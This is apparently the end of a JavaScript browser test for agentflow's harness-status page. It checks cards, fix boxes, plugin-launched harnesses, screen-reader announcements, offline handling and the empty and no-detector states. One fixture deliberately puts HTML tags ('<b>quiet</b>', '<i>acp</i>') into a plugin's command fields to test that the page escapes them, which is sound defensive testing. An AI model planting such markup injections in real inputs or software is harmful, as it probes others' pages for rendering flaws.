    check(card("gemini") === kept && card("opencode").classList.contains("live-changed") && shows("codex-acp","auth") === "Signed in" && !part("codex-acp","methods").open && part("codex-acp","fix").hidden
      ,"the live change is wrong");
    await until(() => said() === "Harness Codex CLI: ready. Harness OpenCode found: probe failed.","the live change is not announced: " + said());

    // Automatic probes turned off in Settings shows here; the page itself changes nothing.
    const waiting = harness("waiting",{code:"not_probed",probe:{status:"refused",code:"needs_person"},acp:undefined,auth:{status:"unknown",code:"needs_person"},fix:{text:"Automatic probes are off. Probe it yourself, or turn them on.",command:"agentflow ai harnesses --probe"}});
    // A harness a plugin added: Probe now at the top skips it, so its fix box holds its own Probe now, which names its ID.
    // Its fix box shows everything that probe runs, in order, with no Copy button: the version command, then the command.
    const pluginFix = id => ({text:"A plugin chose the command or its arguments, so agentflow never probes it automatically, for an agent or in a probe of every harness. Probe it by name if you trust it.",command:"agentflow ai harnesses --probe --id " + id});
    const plugged = harness("acme-agent",{name:"Acme",sources:["plugin:acme"],code:"not_probed",command:"acme",args:["acp","--mode=stdio"],version_args:["version","--short"],probe:{status:"refused",code:"plugin_launch"},acp:undefined,notes:["plugin_launch"],
      fix:pluginFix("acme-agent")});
    // No version command, and hostile text in the command, args and version args.
    const unversioned = harness("quiet-agent",{name:"Quiet",sources:["plugin:acme"],code:"not_probed",command:"<b>quiet</b>",args:["<i>acp</i>"],version_args:["<u>v</u>"],no_version:true,probe:{status:"refused",code:"plugin_launch"},acp:undefined,notes:["plugin_launch"],
      fix:pluginFix("quiet-agent")});
    await post("emit",delta(8,"config.layer.changed",[entry(state([gemini,claude,signedIn,mine,probed,waiting,plugged,unversioned,opencode,goose,pi],{auto_probe:false}))]));
    await until(() => byID("harnesses-auto").textContent === "Off","automatic probes are not shown as off");
    const turnOn = part("waiting","fix").querySelector("a");
    check(shows("waiting","status") === "Not probed" && part("waiting","fix").querySelector(".hn-fix-text").textContent === "Automatic probes are off. Probe it yourself, or turn them on." && turnOn.textContent === "turn them on" && turnOn.getAttribute("href") === "#settings?group=ai"
      && commands(part("waiting","fix")).length === 0 && part("waiting","fix").contains(part("waiting","probe")) && shows("waiting","auth-detail") === "","the card that waits for a person is wrong");
    check(part("acme-agent","fix").contains(part("acme-agent","probe")) && part("acme-agent","probe").dataset.part === "probe" && card("acme-agent").dataset.key === "acme-agent" && commands(part("acme-agent","fix")).length === 0
      && fact("acme-agent","probe").textContent === "Not run: a plugin chose how it starts, so only its own Probe now runs it"
      && byID("harnesses-probe-hint").textContent.includes("A harness a plugin added is skipped"),"the plugin harness card does not lead to its own probe by name");
    check(part("acme-agent","launch").textContent === "Probe now runs acme version --short for its version, then acme acp --mode=stdio."
      && [...part("acme-agent","launch").querySelectorAll("code")].map(code => code.textContent).join("|") === "acme version --short|acme acp --mode=stdio"
      && part("acme-agent","fix").contains(part("acme-agent","launch")) && part("acme-agent","launch").compareDocumentPosition(part("acme-agent","probe")) & Node.DOCUMENT_POSITION_FOLLOWING,"the plugin harness card does not show what its probe runs");
    check(part("quiet-agent","launch").textContent === "Probe now runs <b>quiet</b> <i>acp</i> (no version command)." && !card("quiet-agent").querySelector("b, i, u") && commands(part("quiet-agent","fix")).length === 0
      && !part("waiting","fix").querySelector('[data-part="launch"]'),"the no-version plugin harness card is wrong");
    check(byID("harnesses-auto").dataset.state === "off" && byID("harnesses-auto-detail").textContent.includes("only looks at files") && byID("harnesses-auto").classList.contains("live-changed"),"the automatic probes change is not shown");

    // Everything ready: the other group says that nothing needs attention.
    await post("emit",delta(9,"harness.changed",[entry(state([gemini,claude]))]));
    await until(() => keys("ready") === "gemini,claude-acp" && keys("attention") === "","the groups did not shrink");
    check(!byID("harnesses-attention-none").hidden && byID("harnesses-attention-list").hidden && byID("harnesses-attention-count").textContent === "" && byID("harnesses-summary").textContent.startsWith("2 harnesses found · 2 ready. "),"an empty group is not explained");

    // Nothing found: the empty state with the commands to copy.
    await post("emit",delta(10,"harness.removed",[entry(state([]))]));
    await until(() => !byID("harnesses-empty").hidden,"the empty state does not show");
    check(byID("harnesses-ready").hidden && byID("harnesses-attention").hidden && byID("harnesses-probe").parentNode.hidden && byID("harnesses-probe-hint").hidden && commands(byID("harnesses-empty")).join() === "agentflow ai harnesses --all,agentflow ai doctor"
      && byID("harnesses-empty-title").textContent === "No ACP harnesses found on your PATH" && byID("harnesses-summary").textContent.startsWith("Checked at "),"the empty state is wrong");

    // A daemon without harness detection: a notice, no probe button and no check.
    await post("emit",delta(11,"config.layer.changed",[entry({detector:false,registry,auto_probe:true,harnesses:[],checked_at:""})]));
    await until(() => !byID("harnesses-detector").hidden,"a daemon without detection is not explained");
    check(byID("harnesses-detector").textContent.includes("open it again with agentflow ui") && commands(byID("harnesses-detector")).join() === "agentflow ai harnesses","the page without detection does not say what to do");
    check(byID("harnesses-empty").hidden && byID("harnesses-probe").parentNode.hidden && byID("harnesses-summary").hidden && byID("harnesses-auto-detail").textContent.includes("does not detect harnesses"),"the page without detection is wrong");
    await until(() => said() === "Harness detection stopped.","the end of detection is not announced: " + said());

    // The page polls nothing: no request leaves while it only shows.
    const quiet = (await sent()).length;
    await pause(1300);
    check((await sent()).length === quiet,"the page sent a request by itself");

    // Offline: the last values stay and the page says they may be stale.
    await post("emit",delta(12,"harness.detected",[entry(state([gemini,codex]))]));
    await until(() => keys("ready") === "gemini" && keys("attention") === "codex-acp","the harnesses did not return");
    await post("status?code=503");
    await post("drop");
    await until(() => label() === "Offline" && !byID("harnesses-note").hidden,"the page does not say that it is offline");
    check(byID("harnesses-note").textContent.includes("not available") && Boolean(card("gemini")) && !byID("harnesses-body").hidden,"the offline page dropped its values: " + byID("harnesses-note").textContent);
    await post("status?code=0");
    await post("emit",snapshot(13,[entry(state([gemini,codex]))]));
    await until(() => label() === "Live" && byID("harnesses-note").hidden,"the page did not come back");

    // Another page hides this one, and its changes are no longer announced.
    location.hash = "#overview";
    await until(() => !byID("page-overview").hidden && byID("page-harnesses").hidden && current() === "overview","the overview did not reopen");
    const before = said();
    await post("emit",delta(14,"harness.removed",[entry(state([gemini]))]));
    await until(() => !card("codex-acp"),"the page did not follow the stream while closed");
    await pause(100);
    check(said() === before,"a change was announced while the page was closed: " + said());
  } catch (error) {
    result = error.stack || error.message;
  }
  await fetch("/result",{method:"POST",body:String(result).slice(0,4000)});
})();
